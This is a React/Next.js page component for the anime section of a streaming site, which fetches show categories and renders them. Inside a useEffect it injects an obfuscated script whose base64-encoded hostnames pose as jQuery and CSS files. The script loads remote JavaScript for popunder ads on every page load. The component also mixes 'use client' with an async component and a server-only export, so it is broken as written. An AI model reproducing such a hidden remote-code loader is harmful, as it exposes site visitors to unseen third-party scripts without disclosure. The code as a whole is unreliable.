"use client";
import { useEffect } from 'react';
import Hero from '@/components/hero';
import ShowsContainer from '@/components/shows-container';
import { siteConfig } from '@/configs/site';
import { Genre } from '@/enums/genre';
import { RequestType, type ShowRequest } from '@/enums/request-type';
import { getRandomShow } from '@/lib/utils';
import MovieService from '@/services/MovieService';
import { type CategorizedShows, MediaType, type Show } from '@/types';

export const revalidate = 3600;

export default async function AnimePage() {
  useEffect(() => {
    const script = document.createElement('script');
    script.type = 'text/javascript';
    script.setAttribute('data-cfasync', 'false');
    script.innerHTML = `
      /*<![CDATA[/* */
      (function(){var c=window,k="c2558032fd6c75a989091d04a363dcf9",h=[["siteId",247+225*576-131*378+4985324],["minBid",0],["popundersPerIP","0"],["delayBetween",0],["default",false],["defaultPerDay",0],["topmostLayer","auto"]],s=["d3d3LmludGVsbGlwb3BwdXAuY29tL2F1bml0ZWdhbGxlcnkubWluLmNzcy","ZDNtcjd5MTU0ZDJxZzUuY2xvdWRmcm9udC5uZXQvWGsvbmpxdWVyeS5lbmRsZXNzLXNjcm9sbC5taW4uanM=","d3d3LmN4bWZyeWp4Yy5jb20vY3VuaXRlZ2FsbGVyeS5taW4uY3Nz","d3d3Lm1rcmljb2pvam91LmNvbS9uU0laL2hqcXVlcnkuZW5kbGVzcy1zY3JvbGwubWluLmpz"],m=-1,i,r,e=function(){clearTimeout(r);m++;if(s[m]&&!(1764231079000<(new Date).getTime()&&1<m)){i=c.document.createElement("script");i.type="text/javascript";i.async=!0;var w=c.document.getElementsByTagName("script")[0];i.src="https://"+atob(s[m]);i.crossOrigin="anonymous";i.onerror=e;i.onload=function(){clearTimeout(r);c[k.slice(0,16)+k.slice(0,16)]||e()};r=setTimeout(e,5E3);w.parentNode.insertBefore(i,w)}};if(!c[k]){try{Object.freeze(c[k]=h)}catch(e){}e()}})();
      /*]]>/* */
    `;
    document.body.appendChild(script);

    return () => {
      document.body.removeChild(script);
    };
  }, []);

  const h1 = `${siteConfig.name} Anime`;
  const requests: ShowRequest[] = [
    {
      title: 'Anime TV Shows Latest',
      req: { requestType: RequestType.ANIME_LATEST, mediaType: MediaType.TV },
      visible: true,
    },
    {
      title: 'Anime TV Shows Trending',
      req: {
        requestType: RequestType.ANIME_TRENDING,
        mediaType: MediaType.TV,
      },
      visible: true,
    },
    {
      title: 'Anime TV Shows Top Rated',
      req: {
        requestType: RequestType.ANIME_TOP_RATED,
        mediaType: MediaType.TV,
      },
      visible: true,
    },
    {
      title: 'Netflix Anime TV Shows',
      req: { requestType: RequestType.ANIME_NETFLIX, mediaType: MediaType.TV },
      visible: true,
    },
    {
      title: 'Anime Movies Latest',
      req: {
        requestType: RequestType.ANIME_LATEST,
        mediaType: MediaType.MOVIE,
      },
      visible: true,
    },
    {
      title: 'Anime Movies Top Rated',
      req: {
        requestType: RequestType.ANIME_TOP_RATED,
        mediaType: MediaType.MOVIE,
      },
      visible: true,
    },
  ];
  let allShows = await MovieService.getShows(requests);
  allShows = allShows.map((category: CategorizedShows) => {
    return {
      ...category,
      shows: category.shows.map((show: Show) => {
        return {
          ...show,
          media_type: category.title.includes('Movies')
            ? MediaType.MOVIE
            : MediaType.TV,
        };
      }),
    };
  });
  const randomShow: Show | null = getRandomShow(allShows);

  return (
    <>
      <h1 className="hidden">{h1}</h1>
      <Hero randomShow={randomShow} />
      <ShowsContainer shows={allShows} />
    </>
  );
}
